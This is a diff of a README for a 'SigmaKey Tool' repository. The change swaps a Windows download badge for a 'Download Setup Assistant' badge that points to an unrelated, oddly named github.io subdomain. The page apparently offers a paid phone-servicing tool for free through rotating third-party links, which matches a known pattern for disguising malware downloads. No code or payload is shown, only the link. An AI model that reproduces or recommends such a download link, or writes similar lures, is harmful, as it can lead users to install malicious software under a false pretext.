@@ -4,13 +4,7 @@
 
 <h1 align="center">🔧 SigmaKey Tool</h1>
 
-<p align="center">
-  <a href="https://sigmakey-free-tool-pc.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20SigmaKey-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download SigmaKey for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://hhikaribeefsk.github.io/.github/sigmakey-tool)
 
 ---
 
